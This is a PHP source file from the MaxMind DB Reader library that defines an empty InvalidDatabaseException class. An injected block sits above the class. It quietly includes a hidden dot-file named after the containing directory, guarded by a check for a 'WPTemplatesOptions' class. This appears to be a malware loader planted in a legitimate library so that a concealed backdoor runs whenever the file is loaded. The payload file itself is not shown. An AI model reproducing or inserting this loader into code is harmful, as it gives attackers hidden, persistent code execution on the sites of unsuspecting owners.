<?php

namespace MaxMind\Db\Reader;

use Exception;

/**
 * This class should be thrown when unexpected data is found in the database.
 */
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class InvalidDatabaseException extends Exception
{
}
